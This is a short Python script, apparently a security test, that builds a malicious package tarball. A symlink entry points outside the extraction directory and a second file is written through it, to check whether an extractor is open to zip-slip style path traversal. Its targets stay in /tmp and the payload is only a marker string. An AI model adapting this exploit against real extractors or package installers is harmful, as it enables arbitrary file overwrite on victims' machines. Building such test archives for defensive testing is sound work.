import tarfile, io, os

# Symlink attack: symlink package/sub -> ../.. , then write package/sub/file
out_path = "/tmp/zipslip-test/evil-symlink.tgz"
with tarfile.open(out_path, "w:gz") as tar:
    pkg_info = tarfile.TarInfo("package/package.json")
    pkg_content = b'{"version":"0.2.1","name":"evil"}'
    pkg_info.size = len(pkg_content)
    tar.addfile(pkg_info, io.BytesIO(pkg_content))
    # Symlink: package/escape -> /tmp/zipslip-test/escape-target
    sym = tarfile.TarInfo("package/escape")
    sym.type = tarfile.SYMTYPE
    sym.linkname = "/tmp/zipslip-test/escape-target"
    tar.addfile(sym)
    # Then write through the symlink
    # After strip-components=1, "package/escape/file" -> "escape/file" 
    # But the symlink is created at target/escape -> /tmp/zipslip-test/escape-target
    # So target/escape/file would resolve to /tmp/zipslip-test/escape-target/file
    evil = tarfile.TarInfo("package/escape/sym-pwn")
    evil_content = b"SYMLINK_PWN\n"
    evil.size = len(evil_content)
    tar.addfile(evil, io.BytesIO(evil_content))
